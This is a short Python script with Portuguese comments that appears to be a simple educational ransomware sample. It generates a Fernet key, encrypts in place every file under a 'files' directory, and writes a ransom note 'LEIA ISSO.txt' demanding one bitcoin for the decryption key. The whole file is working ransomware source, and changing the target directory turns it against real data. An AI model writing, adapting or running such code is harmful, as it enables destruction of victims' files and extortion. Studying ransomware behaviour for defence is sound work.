from cryptography.fernet import Fernet
import os


# Gerar uma chave aleatória e salvar em um arquivo
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
    
# Carregar a chave do arquivo
def carregar_chave():
    return open("chave.key", "rb").read()

# Criptografar em um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_criptografados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_criptografados)

# Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != 'ransoware.py' and not nome.endswith('chave.key'):
                lista.append(caminho)
    return lista

# Mensagem de resgate
def mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as file:
        file.write("Seus arquivos foram criptografados!\n")
        file.write("Para recuperar seus arquivos, envie 1 bitcoin para o endereço x! \n")
        file.write("Após o pagamento, entre em contato com o suporte para obter a chave de descriptografia.")

# Execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    mensagem_resgate()
    print("Todos os arquivos foram criptografados. Verifique o arquivo 'LEIA ISSO.txt' para instruções de resgate.")

if __name__ == "__main__":
    main()